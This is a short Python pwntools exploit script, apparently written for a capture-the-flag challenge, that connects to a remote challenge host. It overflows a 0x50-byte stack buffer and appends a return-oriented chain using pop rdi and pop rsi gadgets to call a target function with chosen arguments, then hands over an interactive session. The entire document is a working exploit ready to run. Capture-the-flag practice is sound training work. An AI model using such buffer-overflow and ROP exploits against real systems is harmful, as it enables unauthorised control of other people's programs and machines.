from pwn import*
context.arch="amd64"
context.terminal="kitty" #adjust this with ur terminal or comment/remove the line
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10006"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)
poprdi=0x000000000040117a
poprsi=0x000000000040117c
# Build a ROP chain to set up two arguments and call the target gadget/function
# Overflow: 0x50 bytes to reach saved return pointer.
# Then we put a dummy 8 bytes (p64(0)) to align/overwrite saved base pointer.
# The chain uses `pop rdi; ret` and `pop rsi; ret` style gadgets to set
# up registers for the following call. The values 0xdeadbeef and 0xc0feebabe
# are placeholders for the arguments the target expects.
payload = b"a"*0x50 + p64(0) + p64(poprdi) + p64(0xdeadbeef) + p64(poprsi) + p64(0xc0feebabe) + p64(0x0000000000401181)

p.sendline(payload)
p.interactive()
